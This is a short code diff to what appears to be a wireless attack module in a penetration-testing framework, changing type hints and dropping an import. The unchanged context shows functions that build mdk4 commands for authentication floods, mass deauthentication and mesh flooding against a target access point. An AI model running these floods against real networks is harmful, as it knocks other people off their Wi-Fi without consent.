@@ -15,7 +15,6 @@ Attack modes:
 Version: 1.1.0
 """
 
-from __future__ import annotations
 
 import logging
 import random
@@ -57,21 +56,21 @@ class Exploit(Exploit):
     duration = OptInteger(30, "Duration in seconds (0 = continuous)")
     dry_run = OptBool(False, "Print command without executing")
 
-    def _mdk4_auth_flood(self) -> List[str]:
+    def _mdk4_auth_flood(self) -> list[str]:
         """Build mdk4 authentication flood command."""
         cmd = ["sudo", "mdk4", self.interface, "a"]
         if self.target_bssid:
             cmd.extend(["-a", self.target_bssid])
         return cmd
 
-    def _mdk4_amok(self) -> List[str]:
+    def _mdk4_amok(self) -> list[str]:
         """Build mdk4 amok (mass deauth) command."""
         cmd = ["sudo", "mdk4", self.interface, "d"]
         if self.target_bssid:
             cmd.extend(["-B", self.target_bssid])
         return cmd
 
-    def _mdk4_mesh_flood(self) -> List[str]:
+    def _mdk4_mesh_flood(self) -> list[str]:
         """Build mdk4 mesh mode command (issue #116 coverage)."""
         cmd = ["sudo", "mdk4", self.interface, "s"]
         return cmd
